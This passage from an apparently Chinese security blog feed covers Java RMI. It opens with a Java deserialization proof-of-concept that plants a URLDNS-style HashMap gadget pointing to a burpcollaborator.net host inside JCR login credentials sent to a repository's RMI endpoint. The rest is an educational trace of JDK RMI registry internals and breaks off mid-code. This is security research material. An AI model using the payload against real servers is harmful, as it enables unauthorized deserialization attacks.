class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.jcr.Repository;<br><span class="hljs-keyword">import</span> javax.jcr.SimpleCredentials;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://6nueyl0q7a2vwl21uub3t1a4wv2lqa.burpcollaborator.net&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clas</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clas.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(url,<span class="hljs-number">123</span>); <span class="hljs-comment">//将url的hashcode属性改为123使其不等于-1</span><br>        map.put(url,<span class="hljs-string">&quot;2333&quot;</span>); <span class="hljs-comment">//这里的value用不上，随便设置</span><br>        field.set(url,-<span class="hljs-number">1</span>);<span class="hljs-comment">//put完之后，我们就需要将hashcode属性改回成-1，从而能执行handler.hashcode</span><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> map;<br><br>            <span class="hljs-type">SimpleCredentials</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleCredentials</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>.toCharArray());<br>            exp.setAttribute(<span class="hljs-string">&quot;admin&quot;</span>,payload);<br>            <span class="hljs-type">Repository</span> <span class="hljs-variable">repository</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLRemoteRepository</span>(<span class="hljs-string">&quot;http://localhost:8080/rmi&quot;</span>);<br>            repository.login(exp);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>复现：</p><p><img src="https://ice.frostsky.com/2023/08/23/d7c999a07f529540a15ced4c88266332.png" alt="image-20230823102630191"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>没人比我更懂RMI(中)</title>
    <link href="/2023/08/22/%E6%B2%A1%E4%BA%BA%E6%AF%94%E6%88%91%E6%9B%B4%E6%87%82RMI2/"/>
    <url>/2023/08/22/%E6%B2%A1%E4%BA%BA%E6%AF%94%E6%88%91%E6%9B%B4%E6%87%82RMI2/</url>
    
    <content type="html"><![CDATA[<p>在上一篇文章当中我们简单的讲解了RMI的基础概念，在这一篇文章中，我们将深入剖析RMI各部分的通信过程，最后一篇再来讲漏洞利用。</p><p>有朋友说上一篇只放截图没有圈重点，这样对刚开始学的学弟学妹不太友好，那我这一篇我尽量补上。</p><p>通过之前的讲解我们知道RMI一共分为三部分分别是：客户端、服务端、注册中心。他们之间可以两两相互通信。简单画个图就是这样：</p><p><img src="https://ice.frostsky.com/2023/08/22/23039956dc27c72043edd4276ba1853d.png" alt="image-20230822145352149"></p><p>获取注册中心的方式共有两种：</p><p>一种是：<code>Registry r = LocateRegistry.createRegistry(1088);</code>在创建时获取。</p><p>另一种是：<code>Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1088);</code>远程获取。</p><h3 id="本地获取注册中心"><a href="#本地获取注册中心" class="headerlink" title="本地获取注册中心"></a>本地获取注册中心</h3><p>我们先来看第一种，本地获取注册中心。</p><p><code>createRegistry()</code>如下有两种方法：</p><p><img src="https://ice.frostsky.com/2023/08/22/4b2d9342d88710f6d22136e3096d1408.png" alt="image-20230822150942148"></p><p>第一种只需要传入<code>port</code>（这里的port代表的就是注册中心监听的端口）</p><p>第二种方式除了传入端口之外，还需要传入两个Socket对象。</p><p>其实这两种方法最终获取到的都是RegistryImpl对象，所以对于我们来说用哪种意义不大，我们只需要分析第一种即可。</p><p>通过上图我们可以看到如果只传入port的话，他会new一个RegistryImpl()对象，我们可以跟进看一下具体的实现步骤。</p><p><img src="https://ice.frostsky.com/2023/08/22/cf4b52a033f2c39553a24d30c7e89f7d.png" alt="image-20230822152426268"></p><p>可以看到内部时做了判断，首先要求端口等于1099且设置了安全管理器会进入if。否则会执行else中的代码，可以看到，不管是if还是else他们中都有我们上一篇文章中提到的<code>LiveRef</code>，我们知道<code>LiveRef</code>是经过封装的处理网络请求的类。</p><p>再往后就是创建stub和Skeleton了，我们省去这步，之后就到了<code>TCPTransport.Object</code>：</p><p><img src="https://ice.frostsky.com/2023/08/22/acfe9a0a16740e3c29e158d17db5bde5.png" alt="image-20230822154504105"></p><p>跟进listen()方法：</p><p><img src="https://ice.frostsky.com/2023/08/22/74e8ce5c4cfa5131f6e02b18b59b853c.png" alt="image-20230822155148288"></p><p>在newServerSocket时会开启端口监听，接着会设置AcceptLoop线程，此时会触发run方法。</p><p><img src="https://ice.frostsky.com/2023/08/22/a2e20a9d46e7d0f517503841b067113e.png" alt="image-20230822155032317"></p><p>在跟进<code>executeAcceptLoop()</code>:</p><p>他会获取到请求的相关信息，比如Host之类的；之后在下边会创建一个线程调用<code>ConnectionHandler</code>来处理请求：</p><p><img src="https://ice.frostsky.com/2023/08/22/a1d3ca5eff9e5e7ec2661fdf83e1ce7b.png" alt="image-20230822155513463"></p><p>跟进<code>ConnectionHandler</code>：</p><p><img src="https://ice.frostsky.com/2023/08/22/40df2c94f5fca5d56fe89e40ce9661da.png" alt="image-20230822160103475"></p><p>这里的var2就是上面传入的ServerSocket对象，再跟进<code>run0()</code>：</p><p>这个<code>run0</code>代码有点多我就不截图了，直接贴上，方便大家阅读</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run0</span><span class="hljs-params">()</span> &#123;<br>           <span class="hljs-type">TCPEndpoint</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> TCPTransport.<span class="hljs-built_in">this</span>.getEndpoint();<br>           <span class="hljs-type">int</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> var1.getPort();<br>           TCPTransport.threadConnectionHandler.set(<span class="hljs-built_in">this</span>);<br><br>           <span class="hljs-keyword">try</span> &#123;<br>               <span class="hljs-built_in">this</span>.socket.setTcpNoDelay(<span class="hljs-literal">true</span>);<br>           &#125; <span class="hljs-keyword">catch</span> (Exception var31) &#123;<br>           &#125;<br><br>           <span class="hljs-keyword">try</span> &#123;<br>               <span class="hljs-keyword">if</span> (TCPTransport.connectionReadTimeout &gt; <span class="hljs-number">0</span>) &#123;<br>                   <span class="hljs-built_in">this</span>.socket.setSoTimeout(TCPTransport.connectionReadTimeout);<br>               &#125;<br>           &#125; <span class="hljs-keyword">catch</span> (Exception var30) &#123;<br>           &#125;<br><br>           <span class="hljs-keyword">try</span> &#123;<br>               <span class="hljs-type">InputStream</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.socket.getInputStream();<br>               <span class="hljs-type">Object</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> var3.markSupported() ? var3 : <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(var3);<br>               ((InputStream)var4).mark(<span class="hljs-number">4</span>);<br>               <span class="hljs-type">DataInputStream</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>((InputStream)var4);<br>               <span class="hljs-type">int</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var5.readInt();<br>               <span class="hljs-keyword">if</span> (var6 == <span class="hljs-number">1347375956</span>) &#123;<br>                   <span class="hljs-keyword">if</span> (TCPTransport.disableIncomingHttp) &#123;<br>                       <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteException</span>(<span class="hljs-string">&quot;RMI over HTTP is disabled&quot;</span>);<br>                   &#125;<br><br>                   TCPTransport.tcpLog.log(Log.BRIEF, <span class="hljs-string">&quot;decoding HTTP-wrapped call&quot;</span>);<br>                   ((InputStream)var4).reset();<br><br>                   <span class="hljs-keyword">try</span> &#123;<br>                       <span class="hljs-built_in">this</span>.socket = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpReceiveSocket</span>(<span class="hljs-built_in">this</span>.socket, (InputStream)var4, (OutputStream)<span class="hljs-literal">null</span>);<br>                       <span class="hljs-built_in">this</span>.remoteHost = <span class="hljs-string">&quot;0.0.0.0&quot;</span>;<br>                       var3 = <span class="hljs-built_in">this</span>.socket.getInputStream();<br>                       var4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(var3);<br>                       var5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>((InputStream)var4);<br>                       var6 = var5.readInt();<br>                   &#125; <span class="hljs-keyword">catch</span> (IOException var29) &#123;<br>                       <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteException</span>(<span class="hljs-string">&quot;Error HTTP-unwrapping call&quot;</span>, var29);<br>                   &#125;<br>               &#125;<br><br>               <span class="hljs-type">short</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> var5.readShort();<br>               <span class="hljs-keyword">if</span> (var6 == <span class="hljs-number">1246907721</span> &amp;&amp; var7 == <span class="hljs-number">2</span>) &#123;<br>                   <span class="hljs-type">OutputStream</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.socket.getOutputStream();<br>                   <span class="hljs-type">BufferedOutputStream</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(var8);<br>                   <span class="hljs-type">DataOutputStream</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataOutputStream</span>(var9);<br>                   <span class="hljs-type">int</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.socket.getPort();<br>                   <span class="hljs-keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.BRIEF)) &#123;<br>                       TCPTransport.tcpLog.log(Log.BRIEF, <span class="hljs-string">&quot;accepted socket from [&quot;</span> + <span class="hljs-built_in">this</span>.remoteHost + <span class="hljs-string">&quot;:&quot;</span> + var11 + <span class="hljs-string">&quot;]&quot;</span>);<br>                   &#125;<br><br>                   <span class="hljs-type">byte</span> <span class="hljs-variable">var15</span> <span class="hljs-operator">=</span> var5.readByte();<br>                   TCPEndpoint var12;<br>                   TCPChannel var13;<br>                   TCPConnection var14;<br>                   <span class="hljs-keyword">switch</span> (var15) &#123;<br>                       <span class="hljs-keyword">case</span> <span class="hljs-number">75</span>:<br>                           var10.writeByte(<span class="hljs-number">78</span>);<br>                           <span class="hljs-keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) &#123;<br>                               TCPTransport.tcpLog.log(Log.VERBOSE, <span class="hljs-string">&quot;(port &quot;</span> + var2 + <span class="hljs-string">&quot;) suggesting &quot;</span> + <span class="hljs-built_in">this</span>.remoteHost + <span class="hljs-string">&quot;:&quot;</span> + var11);<br>                           &#125;<br><br>                           var10.writeUTF(<span class="hljs-built_in">this</span>.remoteHost);<br>                           var10.writeInt(var11);<br>                           var10.flush();<br>                           <span class="hljs-type">String</span> <span class="hljs-variable">var16</span> <span class="hljs-operator">=</span> var5.readUTF();<br>                           <span class="hljs-type">int</span> <span class="hljs-variable">var17</span> <span class="hljs-operator">=</span> var5.readInt();<br>                           <span class="hljs-keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) &#123;<br>                               TCPTransport.tcpLog.log(Log.VERBOSE, <span class="hljs-string">&quot;(port &quot;</span> + var2 + <span class="hljs-string">&quot;) client using &quot;</span> + var16 + <span class="hljs-string">&quot;:&quot;</span> + var17);<br>                           &#125;<br><br>                           var12 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPEndpoint</span>(<span class="hljs-built_in">this</span>.remoteHost, <span class="hljs-built_in">this</span>.socket.getLocalPort(), var1.getClientSocketFactory(), var1.getServerSocketFactory());<br>                           var13 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPChannel</span>(TCPTransport.<span class="hljs-built_in">this</span>, var12);<br>                           var14 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPConnection</span>(var13, <span class="hljs-built_in">this</span>.socket, (InputStream)var4, var9);<br>                           TCPTransport.<span class="hljs-built_in">this</span>.handleMessages(var14, <span class="hljs-literal">true</span>);<br>                           <span class="hljs-keyword">return</span>;<br>                       <span class="hljs-keyword">case</span> <span class="hljs-number">76</span>:<br>                           var12 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPEndpoint</span>(<span class="hljs-built_in">this</span>.remoteHost, <span class="hljs-built_in">this</span>.socket.getLocalPort(), var1.getClientSocketFactory(), var1.getServerSocketFactory());<br>                           var13 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPChannel</span>(TCPTransport.<span class="hljs-built_in">this</span>, var12);<br>                           var14 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPConnection</span>(var13, <span class="hljs-built_in">this</span>.socket, (InputStream)var4, var9);<br>                           TCPTransport.<span class="hljs-built_in">this</span>.handleMessages(var14, <span class="hljs-literal">false</span>);<br>                           <span class="hljs-keyword">return</span>;<br>                       <span class="hljs-keyword">case</span> <span class="hljs-number">77</span>:<br>                           <span class="hljs-keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) &#123;<br>                               TCPTransport.tcpLog.log(Log.VERBOSE, <span class="hljs-string">&quot;(port &quot;</span> + var2 + <span class="hljs-string">&quot;) accepting multiplex protocol&quot;</span>);<br>                           &#125;<br><br>                           var10.writeByte(<span class="hljs-number">78</span>);<br>                           <span class="hljs-keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) &#123;<br>                               TCPTransport.tcpLog.log(Log.VERBOSE, <span class="hljs-string">&quot;(port &quot;</span> + var2 + <span class="hljs-string">&quot;) suggesting &quot;</span> + <span class="hljs-built_in">this</span>.remoteHost + <span class="hljs-string">&quot;:&quot;</span> + var11);<br>                           &#125;<br><br>                           var10.writeUTF(<span class="hljs-built_in">this</span>.remoteHost);<br>                           var10.writeInt(var11);<br>                           var10.flush();<br>                           var12 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPEndpoint</span>(var5.readUTF(), var5.readInt(), var1.getClientSocketFactory(), var1.getServerSocketFactory());<br>                           <span class="hljs-keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) &#123;<br>                               TCPTransport.tcpLog.log(Log.VERBOSE, <span class="hljs-string">&quot;(port &quot;</span> + var2 + <span class="hljs-string">&quot;) client using &quot;</span> + var12.getHost() + <span class="hljs-string">&quot;:&quot;</span> + var12.getPort());<br>                           &#125;<br><br>                           ConnectionMultiplexer var18;<br>                           <span class="hljs-keyword">synchronized</span>(TCPTransport.<span class="hljs-built_in">this</span>.channelTable) &#123;<br>                               var13 = TCPTransport.<span class="hljs-built_in">this</span>.getChannel(var12);<br>                               var18 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionMultiplexer</span>(var13, (InputStream)var4, var8, <span class="hljs-literal">false</span>);<br>                               var13.useMultiplexer(var18);<br>                           &#125;<br><br>                           var18.run();<br>                           <span class="hljs-keyword">return</span>;<br>                       <span class="hljs-keyword">default</span>:<br>                           var10.writeByte(<span class="hljs-number">79</span>);<br>                           var10.flush();<br>                           <span class="hljs-keyword">return</span>;<br>                   &#125;<br>               &#125;<br><br>               TCPTransport.closeSocket(<span class="hljs-built_in">this</span>.socket);<br>           &#125; <span class="hljs-keyword">catch</span> (IOException var32) &#123;<br>               TCPTransport.tcpLog.log(Log.BRIEF, <span class="hljs-string">&quot;terminated with exception:&quot;</span>, var32);<br>               <span class="hljs-keyword">return</span>;<br>           &#125; <span class="hljs-keyword">finally</span> &#123;<br>               TCPTransport.closeSocket(<span class="hljs-built_in">this</span>.socket);<br>           &#125;<br><br>       &#125;<br></code></pre></td></tr></table></figure><p>总结一下就是，先是TCP传输连接处理方法，然后根据不同的调用类型进行相应处理，我们重点关注<code>handleMessages</code>来处理请求：</p><p><img src="https://ice.frostsky.com/2023/08/22/e59771e38ad7f3c84349c59f0efb70d4.png" alt="image-20230822161209922"></p><p>上面还是获取客户端传来的数据，我们主要看下面的部分：</p><p><img src="https://ice.frostsky.com/2023/08/22/24f33ca283f4a04f8dc199b3a8f09598.png" alt="image-20230822161256820"></p><p>这里只需要关注80，因为客户端发送数据的时候这里发的是80，具体后边会说。</p><p>在80部分，先创建了<code>StreamRemoteCall()</code>对象，并传入var1，var1是当前连接的Connection对象。再跟进<code>serviceCall()</code>：</p><p><img src="https://ice.frostsky.com/2023/08/22/e47f9c3228385f27fce79ae0074d3314.png" alt="image-20230822161710312"></p><p>上面还是先获取信息(ObjID、Target对象…..)，再下面会调用<code>dispath()</code>来处理请求，他本身几首两个参数，一个是<code>Remote</code>对象，一个是当前连接的<code>StreamRemoteCall</code>对象，接着跟进：</p><p><img src="https://ice.frostsky.com/2023/08/22/662717d17f9886a6502a89856e819ba6.md.png" alt="image-20230822162739226"></p><p>前面还是接收数据，接着会调<code>oldDispatch()</code>:</p><p><img src="https://ice.frostsky.com/2023/08/22/275901a46a4cb7c12f85137e55ea6793.png" alt="image-20230822162922253"></p><p>最后调用了<code>this.skel.dispatch()</code>,此时的<code>this.skel</code>为刚刚创建的<code>RegistryImpl_Skel</code>对象，接着跟进：</p><p><img src="https://ice.frostsky.com/2023/08/22/1940958287a24a2e3ac4012d570b37a2.png" alt="image-20230822163235287"></p><p><img src="https://ice.frostsky.com/2023/08/22/8fa89c502acee602776f65be69d4a756.png" alt="image-20230822163348059"></p><p>这里就是真正处理请求的核心了，<code>var3</code>是传递过来的int类型的参数，在这里有如下对应关系(附代码)：</p><ul><li><strong>0—&gt;bind</strong></li><li><strong>1—&gt;list</strong></li><li><strong>2—&gt;lookup</strong></li><li><strong>3—&gt;rebind</strong></li><li><strong>4—&gt;unbind</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">switch</span> (var3) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                    RegistryImpl.checkAccess(<span class="hljs-string">&quot;Registry.bind&quot;</span>);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var9 = var2.getInputStream();<br>                        var7 = (String)var9.readObject();<br>                        var80 = (Remote)var9.readObject();<br>                    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | IOException var77) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var77);<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        var2.releaseInputStream();<br>                    &#125;<br><br>                    var6.bind(var7, var80);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var2.getResultStream(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var76) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var76);<br>                    &#125;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                    var2.releaseInputStream();<br>                    String[] var79 = var6.list();<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var81</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                        var81.writeObject(var79);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var75) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var75);<br>                    &#125;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var8 = var2.getInputStream();<br>                        var7 = (String)var8.readObject();<br>                    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | IOException var73) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var73);<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        var2.releaseInputStream();<br>                    &#125;<br><br>                    var80 = var6.lookup(var7);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var82</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                        var82.writeObject(var80);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var72) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var72);<br>                    &#125;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                    RegistryImpl.checkAccess(<span class="hljs-string">&quot;Registry.rebind&quot;</span>);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var9 = var2.getInputStream();<br>                        var7 = (String)var9.readObject();<br>                        var80 = (Remote)var9.readObject();<br>                    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | IOException var70) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var70);<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        var2.releaseInputStream();<br>                    &#125;<br><br>                    var6.rebind(var7, var80);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var2.getResultStream(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var69) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var69);<br>                    &#125;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                    RegistryImpl.checkAccess(<span class="hljs-string">&quot;Registry.unbind&quot;</span>);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var8 = var2.getInputStream();<br>                        var7 = (String)var8.readObject();<br>                    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | IOException var67) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var67);<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        var2.releaseInputStream();<br>                    &#125;<br><br>                    var6.unbind(var7);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var2.getResultStream(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var66) 